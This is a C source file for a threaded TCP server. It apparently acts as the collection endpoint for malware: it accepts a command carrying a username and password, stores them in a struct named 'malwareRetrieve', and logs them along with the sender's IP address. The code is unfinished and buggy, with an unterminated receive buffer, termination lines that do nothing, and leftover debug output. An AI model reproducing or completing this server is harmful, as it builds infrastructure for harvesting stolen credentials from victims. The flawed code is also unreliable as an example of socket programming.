#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <arpa/inet.h>
#include "server.h"
#include <stdarg.h>

// dont forget about too many conn and dos!!


int socketfd;
struct sockaddr_in addr;
struct sockaddr_in client_addr;
  
void printLog(char *msg, ...){
  printf("\33[2K\r");
  va_list args;
  va_start(args, msg);
  vprintf(msg, args);
  va_end(args);
  printf("Interact -> ");
  fflush(stdout);  
  // printf("%s", msg);
  
}

void *handleClient(void *arg){
  infoclient *client = (infoclient*)  arg;
  if (client == NULL) {
    printf("Client == NULL !!!\n");
    return NULL;
  }
  printLog("[LOG][id: %d - from: %s] Connexion established and is being handled !\n", client->client, client->ip);
  while (1) {
    char buffer[512];
    printf("TEST SHIT \n");
    if (recv(client->client, buffer, sizeof(buffer), 0) >= 0) {
      printf("Raw message received -> %s", buffer);
      buffer[strcspn(buffer, "\r\n")] = '\0';
      printLog("[LOG][id: %d - from: %s] Message received is %s \n",client->client, client->ip, buffer);
      char *saveTOK;
      char *clientinput = strtok_r(buffer, " ", &saveTOK);
      if (strncmp(clientinput, API_COMMAND, strlen(API_COMMAND)) == 0 ) {
        malwareRetrieve current;
        clientinput = strtok_r(NULL, " ", &saveTOK);
        if (clientinput != NULL) {
          strncpy(current.username, clientinput, 64);
          current.username[strlen(current.username)] = '\0';
          clientinput = strtok_r(NULL, " ", &saveTOK);
          if (clientinput != NULL) {
            if (strtok_r(NULL, " ", &saveTOK) != NULL) {
              // Too many arguments!
              printLog("[LOG][id: %d - from: %s] too many arguments!\n", client->client, client->ip);
              break;
            }
            strncpy(current.password, clientinput, 64);
            current.password[strlen(current.password)] = '\0';
            printLog("[LOG][id: %d - from: %s] Successfull connexion to the command\n --> Username: %s, Password: %s ! \n", client->client, client->ip, current.username, current.password);
            strncpy(current.ipaddr, client->ip, 16);
            current.ipaddr[strlen(current.ipaddr)] = '\0';
            close(client->client);
            free(client);
            return NULL;
          }
          else {
              printLog("[LOG][id: %d - from: %s] Wrong api calls!\n", client->client, client->ip);
              break;
          }
        }
        else {
            printLog("[LOG][id: %d - from: %s] Wrong api calls !\n", client->client, client->ip);
            break;
        }
      }
      else {
        printLog("[LOG][id: %d - from: %s] Received wrong arguments !\n", client->client, client->ip);
        break;
      }
           
    }

  }
  printLog("[LOG][id: %d - from: %s] Transaction finished, closing connexion.\n", client->client, client->ip);
  close(client->client);
  free(client);

  
  return NULL;
}

void *ListenToClient(void *arg){
  int socketfd = *(int*) arg;
  printLog("[LOG] Socket binded and listening !\n[LOG] Waiting for new connexion...\n");
  while (1) {
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    int newsocket = accept(socketfd, (struct sockaddr *) &client_addr, &client_len);
    infoclient *client  = malloc(sizeof(infoclient));
    if (client == NULL) {
      printf("Error in malloc\n");
      return 0;
    }
    client->client = newsocket; 
    inet_ntop(AF_INET, &client_addr.sin_addr, client->ip , sizeof(client->ip));
    pthread_t newthread;
    pthread_create(&newthread, NULL, handleClient, client);
    pthread_detach(newthread);
  }

  
}




int main(){
  printLog("[STARTING] Starting the server program\n");
  // Initialise a socket
  int socketfd = socket(AF_INET, SOCK_STREAM, 0);
  if (socketfd == -1) {
    printLog("[LOG] Error code -1 - Failed to initialise a socket ");
  }
  addr.sin_family = AF_INET; // Address on local system
  addr.sin_port = htons(6000); // Port on local system
  addr.sin_addr.s_addr = INADDR_ANY; // Check more available options ??
  if (bind(socketfd, (const struct sockaddr *) &addr, sizeof(addr)) == -1){
    printLog("[LOG] Error code -1 -  in binding the port \n");
    exit(-1);
  }
  if (listen(socketfd, 10) == -1) {
    printLog("[LOG] Error code -1 - Failed to set the socket to listen \n");
    exit(-1);
  }

  pthread_t mainLoop;
  pthread_create(&mainLoop, NULL, ListenToClient, &socketfd);
  printf("Interact -> ");
  while (1) {
    char buffer[64];
    fgets(buffer, sizeof(buffer), stdin);
  }

}
